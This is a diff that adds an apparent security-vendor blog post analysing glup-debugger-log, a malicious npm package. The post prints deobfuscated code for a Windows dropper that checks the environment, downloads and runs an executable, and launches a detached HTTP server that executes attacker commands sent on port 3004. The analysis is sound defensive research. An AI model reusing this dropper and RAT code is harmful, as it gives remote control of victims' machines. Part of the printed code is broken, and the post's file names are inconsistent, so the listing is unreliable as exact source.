@@ -1,0 +1,321 @@
+
+On May 24, 2024, Phylum’s automated risk detection platform alerted us to a suspicious publication on npm. The package in question is called glup-debugger-log and was published with two obfuscated files that worked together; one worked as a kind of initial dropper setting the stage for the malware campaign by compromising the target machine if it met certain requirements, then downloading additional malware components, and the other script providing the attacker with a persistent remote access mechanism to control the compromised machine.
+
+The Attack
+When investigating suspicious npm packages, the package.json is always a good first place to look. It provides a comprehensive base camp for the entire package, containing information about the package’s configuration, dependencies, and scripts. Attackers often exploit this file by inserting malicious commands in various installation hooks, etc. in order to get code to directly execute on install. Let’s first take a look in the package.json file to see if anything unusual is going on there:
+{
+  "name": "glup-debugger-log",
+  "version": "0.0.3",
+  "description": "[Neww]Logger for glup plugins",
+  "main": "index.js",
+  "scripts": {
+    "pretest": "npm run lint",
+    "//build": "tsc",
+    "build": "tsc && javascript-obfuscator ./lib/play.js --output  ./lib/play.js --options-preset=high-obfuscation && javascript-obfuscator ./lib/play-share.js --output  ./lib/play-share.js --options-preset=high-obfuscation",
+    "format": "prettier --write \\"src/**/*.ts\\" \\"src/**/*.js\\"",
+    "lint": "eslint",
+    "test": "node ./index.js",
+    "publish": "node run build && npm publish"
+  },
+  "author": "wzh0505",
+  "license": "MIT",
+  "engines": {
+    "node": ">= 10.13.0"
+  },
+  "types": "index.d.ts",
+  "files": [
+    "lib/**/*",
+    "LICENSE",
+    "index.js",
+    "index.d.ts"
+  ],
+  "dependencies": {
+    "glogg": "^2.2.0",
+    "iconv-lite": "^0.6.3"
+  },
+  "devDependencies": {
+    "@types/node": "^20.12.7",
+    "@typescript-eslint/eslint-plugin": "^7.9.0",
+    "@typescript-eslint/parser": "^7.9.0",
+    "eslint": "^8.57.0",
+    "javascript-obfuscator": "^4.1.0",
+    "prettier": "^3.2.5",
+    "tslint-config-prettier": "^1.18.0",
+    "typescript": "^5.4.5"
+  },
+  "prettier": {
+    "singleQuote": true
+  },
+  "keywords": [
+    "glup",
+    "debugger",
+    "logging"
+  ]
+}
+The first thing we notice is that the build script is using javascript-obfuscator to obfuscate two files, ./lib/play.js, and ./lib/play-share.js, with the high-obfuscation preset, no less. The other highly unusual thing we see is that the test script is directly executing a javascript file with "test": "node ./index.js". This is not typical and a good place to go check out next. As a reminder, whatever is supplied to the test test will run when npm test is run. So in this case, running npm test will execute node ./index.js. Let’s see what’s there:
+'use strict';
+var localLogger = require("./lib/play");
+localLogger.bind();
+
+var getLogger = require('glogg');
+
+var logger = getLogger('gulplog');
+
+module.exports = logger;
+Not a lot here to unpack. We can see it requires three different libraries. Both gulplog and glogg are legit gulp-related libraries, however, ./lib/play is a local file. It then immediately executes the bind() function from play. Let’s go look there.
+It turns out that play.js is obfuscated. This shouldn’t be surprising based on what we found earlier in the build script. It’s pointless to put the entire file here in its obfuscated form so I’ll just provide a screenshot of some of it.
+image: gjj_images\phylum\20240708_170944_763601\Screenshot-2024-05-24-at-4.41.55-PM.png
+Notice all the identifiers starting with _0x followed by random hex. This is typical JavaScript obfuscation and as part of the deobfuscation process, I’ll try and replace the identifiers with descriptive and appropriate names. Thus, in the code snippets you’ll see below, the naming conventions, with a few of exceptions, are mine. After going through this process, we can take a look at the bind() method that the attacker calls from play.
+The Dropper
+function bind() {
+  let randomNumber = null;
+  for (let i = 0; i < Math.floor(Math.random() * 1000); i++) {
+    randomNumber = i + 2;
+  }
+  (function () {})(randomNumber);
+  new Promise(() => {
+    start();
+    share();
+  });
+}
+
+exports.bind = bind;
+At the bottom here, we can see that bind() is in fact exported from play, which is why they were able to call it from index.js. The bind() function itself is straightforward. First, for some reason, it generates a random number that is not used in any meaningful way and then executes start() and share() within a Promise, which is just a common way in JavaScript to handle async function calls. Let’s start by looking in start().
+function start() {
+  const config = getConfig();
+  checkEnv(config).then(() => {
+    if (config.p === null) {
+      return;
+    }
+    let {
+      p: command,
+      pv: version,
+      fdp: forceDownloadAndExecute
+    } = config;
+    let shouldExecuteLocally = forceDownloadAndExecute !== true && fs.existsSync(EXECUTABLE_PATH);
+    if (shouldExecuteLocally) {
+      executeCommand(command, version);
+      return;
+    }
+    if (forceDownloadAndExecute !== true && fs.existsSync(LOCK_FILE_PATH)) {
+      return;
+    }
+    let isValidUrl = false;
+    try {
+      new URL(command);
+      isValidUrl = true;
+    } catch (err) {}
+    if (!isValidUrl) {
+      executeCommand(command, version);
+    } else {
+      http.get(command, {}, response => {
+        if (response.statusCode === 200) {
+          response.on('end', () => {
+            response.closed();
+            executeCommand(EXECUTABLE_PATH, version);
+          });
+          response.pipe(fs.createWriteStream(EXECUTABLE_PATH));
+        }
+      });
+    }
+  }).catch(err => {
+    console.error(err);
+  });
+}
+First, they grab some “config” information with getConfig():
+function getConfig() {
+  let config = {
+    'p': '',
+    'pv': ''
+  };
+  return config;
+}
+The config contains the keys p and pv which is in this version is hardcoded to empty strings. Back in start() they then use checkEnv() with this config info to run some environment checks to determine whether or not to trigger the malware deployment:
+function checkEnv(config) {
+  const networkInterfaceCheck = new Promise((resolve, reject) => {
+    if (config === null) {
+      reject(new Error('10010'));
+      return;
+    }
+    let matchConfig = config.match;
+    if (matchConfig === null) {
+      resolve(true);
+      return;
+    }
+    let networkInterfaces = getNetworkInterfaces();
+    for (let i = 0; i < networkInterfaces.length; i++) {
+      let networkInterface = networkInterfaces[i];
+      if ((matchConfig.mac || []).indexOf(networkInterface.mac) !== -1 || (matchConfig.ip || []).indexOf(networkInterface.ip) !== -1) {
+        resolve(null);
+        return;
+      }
+    }
+    reject(new Error('10020'));
+  });
+
+  const osCheck = new Promise((resolve, reject) => {
+    if (os.type() === 'Windows_NT') {
+      resolve(null);
+    } else {
+      reject(new Error("10030"));
+
+  const desktopFolderCheck = new Promise((resolve, reject) => {
+    fs.readdir(path.join(HOME_DIR, "Desktop"), (err, files) => {
+      if (err || files.length < 7) {
+        reject(new Error("10040"));
+      } else {
+        resolve(null);
+      }
+    });
+  });
+
+  return new Promise((resolve, reject) => {
+    Promise.allSettled([networkInterfaceCheck, osCheck, desktopFolderCheck]).then(results => {
+      const rejectedIndex = results.findIndex(result => {
+        return result.status === "rejected";
+      });
+      if (rejectedIndex === -1) {
+        resolve(null);
+      } else {
+        reject(results[rejectedIndex]?.reason);
+      }
+    });
+  });
+}
+First, they perform a network interface check. Before this, however, they perform a high-level check to see if config itself is null and if so, fail the check. Then if config.match is null , the network interface check effectively short circuits to resolve(true) and passes. This is interesting because we know that in this version there is no match key in the config map so this check will pass in this case. If a match key value pair were supplied in the config it would go on to check if the machine matched specific MAC addresses or IPs. Presumably, this is some kind of built-in mechanism for future releases that the attacker can use to specify a list of known machines that they want to target.
+After the network interface check, they perform an OS check. In this case they’re looking specifically for Windows systems. All other system types will not pass the check.
+The last check they perform is strangely specific yet vague at the same time. They check to ensure that the Desktop folder of the machine’s home directory contains seven or more items. At first glance, this may seem absurdly arbitrary, but it’s likely that this is a form of user activity indicator or a way to avoid deployment on controlled or managed environments like VMs or brand new installations. It appears the attacker is targeting active developer machines.
+If these three checks are allSettled, meaning they all resolve and are not rejected, then the rejectedIndex will equal -1 and the entire checkEnv() function will return a resolve(null) and the checks are all considered passed.
+Back in start(), let’s keep going assuming we’ve passed the environment check:
+if (config.p === null) {
+      return;
+    }
+    let {
+      p: command,
+      pv: version,
+      fdp: forceDownloadAndExecute
+    } = config;
+They first perform another config-related check; if the config key p is null it bails early. Then they destructure the config map into variables command, version, and forceDownloadAndExecute.
+In this version, we know that fdp was not defined in the config map so forceDownloadAndExecute will be undefined. Let’s see what consequence this has:
+let shouldExecuteLocally = forceDownloadAndExecute !== true && fs.existsSync(EXECUTABLE_PATH);
+if (shouldExecuteLocally) {
+  executeCommand(command, version);
+  return;
+}
+if (forceDownloadAndExecute !== true && fs.existsSync(LOCK_FILE_PATH)) {
+  return;
+}
+The variable shouldExecuteLocally is determined by checking if forceDownloadAndExecute !== true, which in this case is true since undefined !== true evaluates to true. Then they check if a file called "node.compress.exe" exists and if so, the code will then call executeCommand() on the local machine passing in the values of p and pv from the config:
+function executeCommand(command, version) {
+  if (command === '') {
+    return;
+  }
+  childProcess.exec(Buffer.from("Y21kLmV4ZQ==", 'base64').toString() + " /c \\"" + command + "  " + '' + " \\" ", (err, stdout, stderr) => {
+    if (err || stderr) {
+      console.error(err, stderr);
+      fs.openSync(LOCK_FILE_PATH, 'w');
+    } else if (fs.existsSync(LOCK_FILE_PATH)) {
+      fs.rmSync(LOCK_FILE_PATH);
+    }
+  });
+}
+This little snippet is designed to execute a given command in the system’s CLI using node. It also appears to manage a lock/log file of sorts, though in the current implementation, the existence of the lock file is not checked before executing a command and will only be generated if an error occurs. Either way, the command to run is generated dynamically, starting by decoding the hard-coded Bade64 string "Y21kLmV4ZQ==" which decodes to "cmd.exe". If an error is encountered, it logs the error to the console (perhaps they’re still in the testing phase) and then persists the file lock/log file called "node.compress.lock.log". If no errors occur, it checks for the existence of the lock/log file and removes it if it exists.
+Back in start(), if shouldExecuteLocally evaluates to false, then another check is performed:
+if (forceDownloadAndExecute !== true && fs.existsSync(LOCK_FILE_PATH)) {
+      return;
+    }
+Now they are actually checking for the lock/log file, and if it’s found, it will bail early. If it makes it past that check, the following is then run:
+let isValidUrl = false;
+try {
+  new URL(command);
+  isValidUrl = true;
+} catch (err) {}
+if (!isValidUrl) {
+  executeCommand(command, version);
+} else {
+  http.get(command, {}, response => {
+    if (response.statusCode === 200) {
+      response.on('end', () => {
+        response.closed();
+        executeCommand(EXECUTABLE_PATH, version);
+      });
+      response.pipe(fs.createWriteStream(EXECUTABLE_PATH));
+    }
+  });
+}
+They try to parse the supplied command as a URL. If this fails, they simply try to execute the command locally again. If the command does parse as a valid URL, they perform a GET request to the URL, and store the data, presumably a blob of binary data, in the local file called "node.compress.exe" and then that file is executed.
+That brings us to the end of start() so let’s now go take a look in share():
+function share() {
+  const shareScriptPath = path.join(__dirname, "play-share.js");
+  if (fs.existsSync(shareScriptPath)) {
+    childProcess.spawn("node", [shareScriptPath], {
+      'detached': true,
+      'stdio': "ignore"
+    }).unref();
+  }
+}
+This function will simply run play-share.js as a detached background process, allowing it to be run independently of the parent process. In other words, play-share.js will continue to run even after the caller exits. Let’s go take a look in play-share.js.
+The HTTP Server for Arbitrary RCE
+We know from earlier that this script is also obfuscated so I’ll again just show the deobfuscated and refactored version of it so that it’s easy to read and reason about:
+'use strict';
+
+const fs = __importStar(require('fs'));
+const http = __importDefault(require("node:http"));
+const url = __importDefault(require('node:url'));
+const childProcess = __importDefault(require('child_process'));
+const iconv = __importDefault(require("iconv-lite"));
+const path = __importDefault(require('node:path'));
+const os = __importStar(require("node:os"));
+const batchFileName = path['default'].join(os.tmpdir(), Math.random().toString() + ".bat");
+try {
+  fs.writeFileSync(batchFileName, "for /f \\"tokens=5 delims= \\" %%a in ('netstat -ano ^| findstr :3004') do @taskkill /PID %%a /F");
+  childProcess["default"].execSync("start /b cmd.exe /c " + batchFileName + " > nul 2>&1", {
+    'windowsHide': true
+  });
+} finally {
+  if (fs.existsSync(batchFileName)) {
+    console.log(batchFileName);
+  }
+}
+http['default'].createServer({
+  'requestTimeout': 60000
+}, (request, response) => {
+  response.writeHead(200, {
+    'Content-Type': 'text/plain;charset=UTF-8'
+  });
+  let command = url["default"].parse(request.url, true).query.cmd;
+  if (command) {
+    try {
+      childProcess["default"].exec(Buffer.from("Y2hjcCA2NTAwMQ==", "base64").toString() + " & " + command, {
+        'encoding': "buffer",
+        'windowsHide': true
+      }, (error, stdout, stderr) => {
+        if (error) {
+          response.end("ERR:\\n" + error.message);
+        } else {
+          if (stdout) {
+            response.end('' + iconv["default"].decode(stdout, "gbk"));
+          } else if (stderr) {
+            response.end("ERR:\\n" + iconv['default'].decode(stderr, "gbk"));
+          }
+        }
+      });
+    } catch (error) {
+      response.end("ERR:\\n" + error);
+    }
+  }
+}).listen(3004);
+I removed a bunch of helper functions at the top of the code that are used to handle module imports and exports. What you see above is the heart of the malware as it sets up an HTTP server that listens for incoming requests on port 3004. The attacker can then simply make a request to the server with a "cmd" query parameter and the server executes the specified command using the child_process module. The server then sends the output of the command back to the client as a plain text response.
+Putting it all Together
+Now that we’ve looked at this in great detail, let’s take a step back and look at this from a higher level. These two scripts work together to establish remote code execution capabilities on a compromised system. It does so as follows:
+
+The first script, play.js, acts as a form malware dropper or a loader.It checks the environment based on a provided configuration and a few hard-coded requirementsIt has the capability to execute arbitrary commands from a URL or a local fileIt launches play-safe.js in detached mode to establish persistence
+
+It checks the environment based on a provided configuration and a few hard-coded requirements
+It has the capability to execute arbitrary commands from a URL or a local file
+It launches play-safe.js in detached mode to establish persistence
+The second script, play-safe.js establishes an HTTP serverIt listens on port 3004 for incoming commands and executes them via child_process.
+
+It listens on port 3004 for incoming commands and executes them via child_process.
+This is known as a RAT (remote access trojan). It’s both crude and sophisticated at the same time. On the crude side, it’s minimal and focuses solely on core RAT functionality, implemented completely in JavaScript and doesn’t require external binaries or other code. Everything it needs to function is self-contained. On the other hand, it’s sophisticated in that it’s heavily obfuscated, performs a number of environment checks to ensure it’s running on a suitable (or targeted) system, it’s modular in that the dropper and HTTP server are separate and deployed conditionally, implements a crude lock file mechanism, and of course, once established can execute attacker-controlled commands in a number of ways.
+The combination of these crude and sophisticated elements make this RAT implementation particularly interesting from a malware analysis perspective. It continues to highlight the ever-evolving landscape of malware development in the open source ecosystems, where attackers are employing new and clever techniques in an attempt to create compact, efficient, and stealthy malware they hope can evade detection while still possessing powerful capabilities.
